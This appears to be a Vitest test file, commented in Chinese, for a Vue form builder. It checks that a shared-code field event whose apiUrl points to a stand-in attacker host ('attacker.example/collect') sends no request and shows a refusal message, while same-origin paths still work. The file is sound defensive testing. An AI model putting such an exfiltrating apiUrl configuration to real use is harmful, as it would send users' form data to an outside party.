// 端到端防护验证：模拟「恶意分享码 → 表单渲染 → 字段变化」这条链，断言**没有任何外发请求**。
//
// 这是 R5-C3 的核心回归锁：不测"函数返回 false"，而测"fetch 一次都没被调用"——
// 因为真正的风险是数据出去，不是校验函数本身对不对。
import { describe, it, expect, vi, beforeEach } from 'vitest'
import { ref } from 'vue'

const fetchSpy = vi.fn(async () => new Response('{}', { status: 200 }))

describe('分享码外发链：恶意 apiUrl 不得产生任何网络请求', () => {
  beforeEach(() => {
    fetchSpy.mockClear()
    vi.stubGlobal('fetch', fetchSpy)
  })

  it('callApi 指向攻击者域 → 零请求 + 可见提示', async () => {
    const { useFormEvents } = await import('@/components/form-builder/useFormEvents')
    const formData = ref<Record<string, unknown>>({ name: '张三' })
    const toasts: string[] = []
    const api = useFormEvents(
      formData,
      (msg: string) => toasts.push(msg),
      () => {},
      () => {},
    )
    // 字段配置里的 onChange 指向攻击者域（分享码可携带）
    const field = {
      key: 'name',
      label: '姓名',
      events: { onChange: { action: 'callApi', apiUrl: 'https://attacker.example/collect' } },
    }
    api.handleFieldChange(field as never, 'change')
    await new Promise((r) => setTimeout(r, 450)) // 等过 300ms 防抖窗口

    expect(fetchSpy, '恶意 apiUrl 不应发出任何请求').not.toHaveBeenCalled()
    expect(toasts.join(' '), '应给出可见的拒绝提示').toMatch(/拒绝|安全策略/)
  })

  it('同源相对路径仍然正常工作（防「一刀切把功能废掉」）', async () => {
    const { useFormEvents } = await import('@/components/form-builder/useFormEvents')
    const formData = ref<Record<string, unknown>>({ name: '张三' })
    const api = useFormEvents(
      formData,
      () => {},
      () => {},
      () => {},
    )
    const field = {
      key: 'name',
      label: '姓名',
      events: { onChange: { action: 'callApi', apiUrl: '/api/collect' } },
    }
    api.handleFieldChange(field as never, 'change')
    await new Promise((r) => setTimeout(r, 450))

    expect(fetchSpy, '同源相对路径应放行').toHaveBeenCalledTimes(1)
    expect(String(fetchSpy.mock.calls[0][0])).toContain('/api/collect')
  })
})
